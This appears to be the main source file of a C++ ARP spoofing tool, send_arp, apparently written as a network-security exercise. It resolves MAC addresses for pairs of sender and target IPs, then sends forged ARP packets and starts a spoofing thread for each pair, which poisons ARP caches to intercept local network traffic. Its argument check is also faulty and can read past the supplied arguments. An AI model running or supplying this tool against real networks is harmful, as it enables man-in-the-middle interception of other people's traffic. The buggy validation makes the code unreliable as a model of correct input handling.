#include <iostream>

#include "arp.h"

using namespace std;

void usage(){
    cout << "syntax : send_arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]" << endl;
    cout << "sample : send_arp eth0 192.168.0.10 192.168.0.1 192.168.0.1 192.168.0.10" << endl;
}

int main(int argc, char* argv[]) {
    if (((argc % 2) != 0) && ((argc / 2) > 1)) {
        usage();
        return -1;
    }
    int i;
    Arp arp(argv[1]);
    for (i = 2; i < argc; i++) arp.ipSet.insert(inet_addr(argv[i]));
    for (i = 2; i < argc; i+=2) arp.session.insert(make_pair(inet_addr(argv[i]), inet_addr(argv[i+1])));

    set<uint32_t>::iterator iter;
    for (iter = arp.ipSet.begin(); iter != arp.ipSet.end(); iter++){
        uint8_t* tmpmac = reinterpret_cast<uint8_t*>(malloc(sizeof(uint8_t)*ETHER_ADDR_LEN));
        arp.setMac(tmpmac, reinterpret_cast<uint8_t*>(arp.getMac(*iter)));
        arp.p = make_pair(*iter, tmpmac);
        arp.ipMac.insert(arp.p);
    }

    set<pair<uint32_t, uint32_t>>::iterator it;
    thread st[arp.session.size()];
    for(it = arp.session.begin(), i = 0; it != arp.session.end(); it++, i++) {
        cout << "send first ARP Packet" << endl;
        cout << hex << "sender is " << it->first << " target is " << it->second << endl;
        arp.sendArp(it->first, it->second);
        st[i] = arp.spoofingThread(it->first, it->second);
    }
    for (i = 0; i < arp.session.size(); i++) {
        st[i].join();
    }
    return 0;
}
